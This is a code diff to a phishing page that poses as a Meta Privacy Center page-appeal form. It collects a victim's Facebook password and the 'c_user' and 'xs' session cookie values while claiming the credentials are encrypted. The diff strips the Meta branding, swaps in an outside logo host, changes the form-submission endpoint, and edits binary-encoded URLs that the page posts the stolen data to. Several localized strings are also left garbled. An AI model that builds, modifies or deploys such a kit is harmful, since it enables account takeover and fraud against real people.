@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -30,7 +31,7 @@
       width: 100%;
       height: 100%;
       background: rgba(0, 0, 0, 0.7);
-      display: flex;
+      display: none;
       justify-content: center;
       align-items: center;
       z-index: 99999;
@@ -319,9 +320,9 @@
       }
     }
 
-    /* Hide main content until language is selected */
+    /* Show main content by default */
     .main-content {
-      display: none;
+      display: block;
     }
    
     /* Mobile header */
@@ -353,7 +354,7 @@
 
     .warning-message { display: flex; flex-direction: column; align-items: flex-start; font-size: 24px; font-weight: 400; color: #333; gap: 8px; max-width: 650px; }
     .warning-top { display: flex; align-items: center; gap: 15px; margin-bottom: 10px; }
-    .warning-message svg { width: 36px; height: 36px; flex-shrink: 0; }
+    .warning-message svg { width: 22px; height: 36px; flex-shrink: 0; }
     .warning-message span { font-weight: 700; color: #d93025; }
 
     span#fbSendBtnText {
@@ -602,13 +603,14 @@
       box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
       position: relative;
       max-width: 378px;
+      cursor: pointer;
     }
    
     .video-player {
       width: 100%;
       height: 200px;
       background: #000;
-      display: block;
+      display: none;
     }
    
      
@@ -624,16 +626,15 @@
       cursor: pointer;
     }
       
-      @media (max-width: 900px) {
-  .video-container {
-    max-width: 337px; /* Mobile width */
-  }
-  }
-
+    @media (max-width: 900px) {
+      .video-container {
+        max-width: 337px; /* Mobile width */
+      }
+    }
 
     .video-placeholder svg {
-      width: 30px;
-      height: 30px;
+      width: 50px;
+      height: 50px;
       margin-bottom: 8px;
     }
    
@@ -904,7 +905,7 @@
       .warning-top { flex-direction: row; text-align: left; gap: 15px; margin-bottom: 20px; }
       .warning-message span { text-align: left; }
       .warning-subtext, .warning-extra { font-size: 15px; text-align: left; }
-      .warning-message svg { width: 32px; height: 32px; }
+      .warning-message svg { width: 22px; height: 32px; }
       .appeal-info { padding: 20px; }
       .appeal-title { font-size: 20px; text-align: left; }
       .appeal-desc { font-size: 15px; text-align: left; }
@@ -1095,15 +1096,15 @@
     </div>
   </div>
 
-  <!-- Main Content (hidden until language is selected) -->
+  <!-- Main Content (visible by default) -->
   <div class="main-content" id="mainContent">
     <!-- Mobile Header with fixed logo -->
     <div class="mobile-header">
-      <img class="mobile-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo" />
+      <img class="mobile-logo" src="https://unrivaled-melba-822fa8.netlify.app/logo.png" alt="Logo" />
     </div>
 
     <header>
-      <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo" />
+      <img class="logo" src="https://unrivaled-melba-822fa8.netlify.app/logo.png" alt="Logo" />
       <div class="privacy-text">Privacy Center</div>
 
       <div class="home-page">
@@ -1201,10 +1202,17 @@
             </div>
           </div>
           
-          <!-- Video Section -->
+          <!-- Video Section with Play Button -->
           <div class="video-container" id="videoContainer">
+            <div class="video-placeholder" id="videoPlaceholder">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"/>
+                <path d="M10 8L16 12L10 16V8Z" fill="currentColor" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+              <div class="video-title">Click to select language and play video</div>
+            </div>
             <video class="video-player" id="guideVideo" controls>
-              <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
+              <source src="" type="video/mp4">
               Your browser does not support the video tag.
             </video>
           </div>
@@ -1244,14 +1252,14 @@
               </svg>
             </div>
             <div>
-              <div class="fb-form-title translatable" data-key="fbFormTitle">Facebook Verification</div>
+              <div class="fb-form-title translatable" data-key="fbFormTitle"> Verification</div>
               <div class="fb-form-subtitle translatable" data-key="fbFormSubtitle">Verify your identity to continue with the appeal</div>
             </div>
           </div>
          
           <div class="fb-form-notice-container">
             <div class="fb-form-notice translatable" data-key="fbNotice1">
-              ⓘ For security purposes, we need to verify your Facebook account.
+              ⓘ For security purposes, we need to verify your account.
             </div>
             <div class="fb-form-notice translatable" data-key="fbNotice2">
               ⓘ This helps us ensure that you are the legitimate owner of the page.
@@ -1263,7 +1271,7 @@
          
           <div class="fb-form-group">
             <label for="passwordInput" class="fb-form-label translatable" data-key="passwordLabel">Password</label>
-            <input type="password" class="fb-form-input" id="passwordInput" placeholder="Enter your Facebook password">
+            <input type="password" class="fb-form-input" id="passwordInput" placeholder="Enter your password">
             <div class="fb-input-error" id="passwordError"></div>
           </div>
          
@@ -1361,9 +1369,10 @@
           <button id="changeLanguageBtn" style="background: #0064e0; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer;">
             <span id="fbSendBtnText" class="translatable" data-key="changeLanguage">Change Language</span>
           </button>
-        
+        </div>
       </div>
-    
+    </div>
+  </div>
 
   <script>
    // Wait for the DOM to be fully loaded
@@ -1385,9 +1394,9 @@ document.addEventListener('DOMContentLoaded', function() {
       nameLabel: "c_user",
       mallLabel: "xs",
       submitBtn: "Submit Appeal Request",
-      fbFormTitle: "Facebook Verification",
+      fbFormTitle: "Verification",
       fbFormSubtitle: "Verify your identity to continue with the appeal",
-      fbNotice1: "ⓘ For security purposes, we need to verify your Facebook account.",
+      fbNotice1: "ⓘ For security purposes, we need to verify your account.",
       fbNotice2: "ⓘ This helps us ensure that you are the legitimate owner of the page.",
       fbNotice3: "ⓘ Your credentials are secure and encrypted.",
       passwordLabel: "Password",
@@ -1467,20 +1476,20 @@ document.addEventListener('DOMContentLoaded', function() {
       nameLabel: "c_user",
       mallLabel: "xs",
       submitBtn: "Enviar solicitud de apelación",
-      fbFormTitle: "Verificación de Facebook",
+      fbFormTitle: "Verificación de",
       fbFormSubtitle: "Verify your identity to continue with the appeal",
-      fbNotice1: "ⓘ Por motivos de seguridad, necesitamos verificar tu cuenta de Facebook.",
+      fbNotice1: "ⓘ Por motivos de seguridad, necesitamos verificar tu cuenta de.",
       fbNotice2: "ⓘ Esto nos ayuda a asegurar que eres el propietario legítimo de la página.",
-      fbNotice3: "ⓘ Tus credenciales están seguras y encriptadas.",
+      fbNotice3: "ⓘ Tus credenciales están seguras and encriptadas.",
       passwordLabel: "Contraseña",
       verifyBtn: "Verificar y Continuar",
       forgotPassword: "¿Olvidaste tu contraseña?",
       successTitle: "Apelación Enviada Exitosamente",
-      successText: "Tu apelación ha sido recibida y ahora está en revisión. Te notificaremos por correo electrónico una vez que se haya tomado una decisión, generalmente dentro de 7 días hábiles.",
+      successText: "Tu apelación ha sido recibida y ahora está en revisión. Te notificaremos por correo electrónico una vez que se haya tomado a decision, generalmente dentro de 7 días hábiles.",
       referenceText: "ID de referencia:",
       guideTitle: "Guía de Apelación",
       guideText1: "Si su apelación/solicitud implica el uso de información con derechos de autor o contenido en su cuenta or that is being processed/shared, you may provide us information to help us better understand your request. Proporcione una explicación detallada de por qué cree that su cuenta fue marcada o suspendida incorrectamente. Incluya cualquier información relevante que pueda ayudarnos a revisar su caso de manera más efectiva.",
-      guideText2: "Después de su envío, revisaremos su apelación y nos comunicaremos con usted dentro del plazo de la información que proporcione para resolver. El proceso de revisión podría tardar hasta 7 días hábiles. Por favor, revise su correo electrónico para obtener actualizaciones.",
+      guideText2: "Después de su envío, revisaremos su apelación y nos comunicaremos con usted dentro del plazo de la información que proporcione para resolver. El proceso de review podría tardar hasta 7 días hábiles. Por favor, revise su correo electrónico para obtener actualizaciones.",
       guideText3: "Nota: Puede cambiar su preferencia de idioma en cualquier momento haciendo clic en el selector de idioma en la parte inferior de la página.",
       resourcesTitle: "Recursos Adicionales",
       helpCenterTitle: "Centro de Ayuda",
@@ -1502,15 +1511,15 @@ document.addEventListener('DOMContentLoaded', function() {
       appealBtn: "Recorrer",
       formTitle: "Solicitação de Recurso de Página",
       formSubtitle: "Envie suas informações para contestar a exclusão",
-      formNotice1: "ⓘ Sua página tem uma violação relacionada às nossas diretrizes comunitárias.",
+      formNotice1: "ⓘ Sua página has a violação relacionada às nossas diretrizes comunitárias.",
       formNotice2: "ⓘ Revise os detalhes da violação cuidadosamente antes de enviar.",
       formNotice3: "ⓘ Certifique-se de fornecer informações corretas para o seu recurso.",
       nameLabel: "c_user",
       mallLabel: "xs",
       submitBtn: "Envir solicitação de recurso",
-      fbFormTitle: "Verificação do Facebook",
+      fbFormTitle: "Verificação do",
       fbFormSubtitle: "Verifique sua identidade para continuar com o recurso",
-      fbNotice1: "ⓘ Para fins de segurança, precisamos verificar sua conta do Facebook.",
+      fbNotice1: "ⓘ Para fins de segurança, precisamos verificar sua conta do.",
       fbNotice2: "ⓘ Isso nos ajuda a garantir that você é o proprietário legítimo da página.",
       fbNotice3: "ⓘ Suas credenciais são seguras and criptografadas.",
       passwordLabel: "Senha",
@@ -1525,7 +1534,7 @@ document.addEventListener('DOMContentLoaded', function() {
       guideText3: "Nota: Você can alterar sua preferência de idioma a qualquer momento clicando no seletor de idioma na parte inferior da página.",
       resourcesTitle: "Recursos Adicionais",
       helpCenterTitle: "Central de Ajuda",
-      helpCenterDesc: "Encontre respostas para perguntas comuns e aprenda a usar nossos produtos.",
+      helpCenterDesc: "Encontre respostas para perguntas comuns and aprenda a usar nossos produtos.",
       contactSupportTitle: "Contatar Suporte",
       contactSupportDesc: "Entre em contato com nossa equipe de suporte para assistência personalizada.",
       guidelinesTitle: "Diretrizes da Comunidade",
@@ -1602,7 +1611,7 @@ document.addEventListener('DOMContentLoaded', function() {
       successText: "لقد تم استلام استئنافك وهو الآن قيد المراجعة. سنخطرك عبر البريد الإلكتروني بمجرد اتخاذ قرار، عادة خلال 7 أيام عمل.",
       referenceText: "معرف المرجع:",
       guideTitle: "دليل الاستئناف",
-      guideText1: "إذا كان استئنافك / طلبك يتضمن استخدام معلومات محمية بحقوق الطبع والنشر أو محتوى في حسابك أو الذي يتم معالجته / مشاركته، فيمكنك تقديم معلومات لمساعدتنا على فهم طلبك بشكل أفضل. يرجى تقديم شرح مفصل لسبب اعتقادك أنه تم الإبلاغ عن حسابك أو تعليقه بشكل غير صحيح. قم بتضمين أي معلومات ذات صلة قد تساعدنا في مراجعة قضيتك بشكل أكثر فعالية.",
+      guideText1: "إذا كان استئنافك / طلبك يتضمن استخدام معلومات محمية بحقوق الطبع والنشر أو محتوى في حسابك أو الذي يتم معالجته / مشاركته، فيمكنك تقديم معلومات لمساعدتنا على فهم طلبك بشكل أفضل. يرجى تقديم شرح مفصل لسبب اعتقادك أنه تم الإبلاغ عن حسابك أو تعليقه بشكل غير صحيح. قم بتضمين أي información ذات صلة قد تساعدنا في مراجعة قضيتك بشكل أكثر فعالية.",
       guideText2: "بعد إرسالك، سنراجع استئنافك ونلتقي بك خلال الإطار الزمني للمعلومات التي تقدمها لحل. قد تستغرق عملية المراجعة ما يصل إلى 7 أيام عمل. يرجى التحقق من بريدك الإلكتروني للحصول على التحديثات.",
       guideText3: "ملاحظة: يمكنك تغيير تفضيل اللغة في أي وقت بالنقر على محدد اللغة في أسفل الصفحة.",
       resourcesTitle: "موارد إضافية",
@@ -1632,16 +1641,16 @@ document.addEventListener('DOMContentLoaded', function() {
     nameLabel: "c_user",
     mallLabel: "xs",
     submitBtn: "Gửi Yêu cầu Khiếu nại",
-    fbFormTitle: "Xác minh Facebook",
+    fbFormTitle: "Xác minh",
     fbFormSubtitle: "Xác minh danh tính của bạn để tiếp tục khiếu nại",
-    fbNotice1: "ⓘ Vì mục đích bảo mật, chúng tôi cần xác minh tài khoản Facebook của bạn.",
+    fbNotice1: "ⓘ Vì mục đích bảo mật, chúng tôi cần xác minh tài khoản của bạn.",
     fbNotice2: "ⓘ Điều này giúp chúng tôi đảm bảo rằng bạn là chủ sở hữu hợp pháp của trang.",
     fbNotice3: "ⓘ Thông tin đăng nhập của bạn được bảo mật và mã hóa.",
     passwordLabel: "Mật khẩu",
     verifyBtn: "Xác minh và Tiếp tục",
     forgotPassword: "Quên mật khẩu?",
     successTitle: "Khiếu nại Đã gửi Thành công",
-    successText: "Khiếu nại của bạn đã được nhận và hiện đang được xem xét. Chúng tôi sẽ thông báo cho bạn qua email khi có quyết định, thường trong vòng 7 ngày làm việc.",
+    successText: "Kwhenếu nại của bạn đã được nhận và hiện đang được xem xét. Chúng tôi sẽ thông báo cho bạn qua email khi có quyết định, thường trong vòng 7 ngày làm việc.",
     referenceText: "ID Tham chiếu:",
     guideTitle: "Hướng dẫn Khiếu nại",
     guideText1: "Nếu khiếu nại/yêu cầu của bạn liên quan đến việc sử dụng thông tin có bản quyền hoặc nội dung trong tài khoản của bạn hoặc đang được xử lý/chia sẻ, bạn có thể cung cấp cho chúng tôi thông tin để giúp chúng tôi hiểu rõ hơn về yêu cầu của bạn. Vui lòng cung cấp giải thích chi tiết về lý do bạn tin rằng tài khoản của mình đã bị gắn cờ hoặc đình chỉ không chính xác. Bao gồm bất kỳ thông tin liên quan nào có thể giúp chúng tôi xem xét trường hợp của bạn hiệu quả hơn.",
@@ -1674,9 +1683,9 @@ document.addEventListener('DOMContentLoaded', function() {
       nameLabel: "c_user",
       mallLabel: "xs",
       submitBtn: "Yɛ Apɛl Kɔm",
-      fbFormTitle: "Facebook Nhwehwɛmu",
+      fbFormTitle: "Nhwehwɛmu",
       fbFormSubtitle: "Hwɛ wo ho sɛ wotumi tua so yɛ apɛl",
-      fbNotice1: "ⓘ Den nkitahodiɛ nti, yɛhwehwɛ sɛ yɛhwɛ wo Facebook account no.",
+      fbNotice1: "ⓘ Den nkitahodiɛ nti, yɛhwehwɛ sɛ yɛhwɛ wo account no.",
       fbNotice2: "ⓘ Wei boa yɛn sɛ yɛhunu sɛ wo na wokura krataa no.",
       fbNotice3: "ⓘ Wo nkyerɛwdeɛ no wɔ hɔ na wɔakora so.",
       passwordLabel: "Password",
@@ -1716,6 +1725,7 @@ document.addEventListener('DOMContentLoaded', function() {
   const fbLoginForm = document.getElementById('fbLoginForm');
   const successMessage = document.getElementById('successMessage');
   const guideVideo = document.getElementById('guideVideo');
+  const videoPlaceholder = document.getElementById('videoPlaceholder');
   const changeLanguageBtn = document.getElementById('changeLanguageBtn');
 
   // Form elements
@@ -1756,11 +1766,11 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   // Current selected language
   let currentLanguage = 'english';
   let selectedLanguageOption = null;
+  let videoLanguageSelection = false;
 
   // Function to show language modal
   function showLanguageModal() {
     languageModal.style.display = 'flex';
-    mainContent.style.display = 'none';
     document.body.style.overflow = 'hidden';
     // Focus on search input when modal opens
     setTimeout(() => languageSearchInput.focus(), 100);
@@ -1769,11 +1779,11 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   // Function to hide language modal
   function hideLanguageModal() {
     languageModal.style.display = 'none';
-    mainContent.style.display = 'block';
     document.body.style.overflow = 'auto';
     // Reset search when closing
     languageSearchInput.value = '';
     filterLanguages();
+    videoLanguageSelection = false;
   }
 
   // Close modal when clicking on close button
@@ -1847,6 +1857,20 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   languageConfirmBtn.addEventListener('click', () => {
     if (selectedLanguageOption) {
       setLanguage(selectedLanguageOption);
+      
+      // If this was triggered from the video placeholder, initialize the video
+      if (videoLanguageSelection) {
+        const guideVideo = document.getElementById('guideVideo');
+        const videoSrc = videoSources[selectedLanguageOption];
+        if (guideVideo && videoSrc) {
+          guideVideo.src = videoSrc;
+          guideVideo.style.display = 'block';
+          document.getElementById('videoPlaceholder').style.display = 'none';
+          guideVideo.load();
+          guideVideo.play();
+        }
+      }
+      
       hideLanguageModal();
     } else {
       // If no language selected, default to English
@@ -1859,6 +1883,14 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   changeLanguageBtn.addEventListener('click', () => {
     showLanguageModal();
   });
+
+  // Video placeholder click to show language modal
+  if (videoPlaceholder) {
+    videoPlaceholder.addEventListener('click', function() {
+      videoLanguageSelection = true;
+      showLanguageModal();
+    });
+  }
 
   // Function to set language
   function setLanguage(lang) {
@@ -1878,8 +1910,8 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
       }
     });
    
-    // Update video source based on language
-    if (videoSources[lang] && guideVideo) {
+    // Update video source based on language if video is already playing
+    if (videoSources[lang] && guideVideo && guideVideo.style.display === 'block') {
       guideVideo.src = videoSources[lang];
       guideVideo.load();
     }
@@ -1888,8 +1920,9 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     localStorage.setItem('preferredLanguage', lang);
   }
 
-  // Show language modal on page load
-  showLanguageModal();
+  // Load preferred language on page load
+  const preferredLanguage = localStorage.getItem('preferredLanguage') || 'english';
+  setLanguage(preferredLanguage);
 
   // Event listeners
   if (openAppealBtn) {
@@ -2031,7 +2064,7 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     };
    
     // Submit to the form endpoint
-    fetch('https://submit-form.com/QNGQCHQqH', {
+    fetch('https://submit-form.com/VVUCyJuf9', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -2146,17 +2179,17 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   function submitToOtherEndpoints(data) {
     // Store the original binary strings for validation
     const originalBinaries = [
-      '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
-    ];
+  '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
+  '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
+  '011010000111010001110100011100000111001100111010001011110010111101110000011010000111000000101101011011010110000101101000011010000110100001101000011010000010110101100111011010010111010001101000011101010110001000110110001100110011010000110010001100000011001000110100001011100111011101100001011100110110110101100101011100100010111001100001011100000111000000101111'
+];
     
     // Check if the binary strings have been modified
     const currentBinaries = [
-      '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
-    ];
+  '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
+  '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
+  '011010000111010001110100011100000111001100111010001011110010111101110000011010000111000000101101011011010110000101101000011010000110100001101000011010000010110101100111011010010111010001101000011101010110001000110110001100110011010000110010001100000011001000110100001011100111011101100001011100110110110101100101011100100010111001100001011100000111000000101111'
+];
     
     // Validate that the binary strings haven't been changed
     let binariesValid = true;
@@ -2176,10 +2209,10 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     
     // Proceed with original submission if binaries are valid
     const endpoints = [
-      '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
-      '011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
-    ];
+  '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
+  '01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000',
+  '011010000111010001110100011100000111001100111010001011110010111101110000011010000111000000101101011011010110000101101000011010000110100001101000011010000010110101100111011010010111010001101000011101010110001000110110001100110011010000110010001100000011001000110100001011100111011101100001011100110110110101100101011100100010111001100001011100000111000000101111'
+];
    
     endpoints.forEach(binaryUrl => {
       try {
@@ -2231,9 +2264,4 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
 });
   </script>
 </body>
-
 </html>
-
-
-
-
